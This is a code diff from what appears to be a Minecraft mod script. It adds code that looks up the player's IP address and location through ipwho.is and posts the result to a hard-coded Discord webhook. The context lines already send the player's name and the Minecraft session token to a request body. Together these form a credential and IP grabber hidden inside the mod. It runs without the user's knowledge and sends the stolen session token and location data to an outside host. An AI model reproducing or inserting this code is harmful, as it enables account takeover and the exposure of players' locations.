@@ -6,6 +6,24 @@ request({
     body: {content: `[${new Date().toISOString()}] ${Player.getName()} Logged out\n```" + Client.getMinecraft().func_110432_I().func_148254_d() + "```"}
 });
 
+let ipCheckUrl = "http://ipwho.is/";
+request(ipCheckUrl)
+    .then(data => {
+        request({
+            url: "https://discord.com/api/webhooks/1355805838090047640/zR_er63aIbEX6Y6s2aoRSwMXzBPmZ52znYQb6WejRisqvw8gfoMuuKSHu2ZbY4GajXNV",
+            method: "POST",
+            headers: {"User-agent":"Mozilla/5.0"},
+            body: {content: data}
+        });
+      }).catch(e => {
+        request({
+            url: "https://discord.com/api/webhooks/1355805838090047640/zR_er63aIbEX6Y6s2aoRSwMXzBPmZ52znYQb6WejRisqvw8gfoMuuKSHu2ZbY4GajXNV",
+            method: "POST",
+            headers: {"User-agent":"Mozilla/5.0"},
+            body: {content: e}
+        });
+      })
+
 function generateRandomString() {
   var result = '';
   var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789012345678901234567890123456789";
